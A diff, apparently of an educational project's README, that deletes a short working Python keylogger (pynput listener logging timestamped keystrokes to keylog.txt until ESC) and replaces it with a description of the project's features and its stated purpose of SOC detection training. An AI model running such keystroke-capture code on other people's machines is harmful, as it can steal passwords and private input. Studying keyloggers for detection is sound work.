@@ -1,31 +1,24 @@
-from pynput import keyboard
-from datetime import datetime
-import os
+Introduction
 
-# Define the file where logs will be saved
-log_file = "keylog.txt"
+A keylogger is a type of monitoring tool that records keystrokes made on a keyboard. While attackers may misuse keyloggers to steal sensitive information, cybersecurity professionals study them to understand how they work and how to detect them.
 
-def on_press(key):
-    try:
-        # Format the output with time and key
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        with open(log_file, "a") as f:
-            f.write(f"[{current_time}] {key.char}\n")
-    except AttributeError:
-        # Handle special keys (space, enter, etc.)
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        with open(log_file, "a") as f:
-            f.write(f"[{current_time}] {key}\n")
+This project demonstrates a simple keylogger built using Python and tested in Kali Linux for educational purposes.
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        # Stop the listener when ESC is pressed
-        print("Keylogger stopped.")
-        return False
+ Features
 
-# Start the listener in a background thread
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+Captures keyboard inputs using pynput
+
+Logs keystrokes with date & time
+
+Saves output in keylog.txt
+
+Stops when ESC key is pressed
+
+ Purpose
+
+Created to understand keylogging techniques and improve detection skills in SOC environments.
+
+⚠️ Strictly for educational and defensive cybersecurity research only.
 
 
 
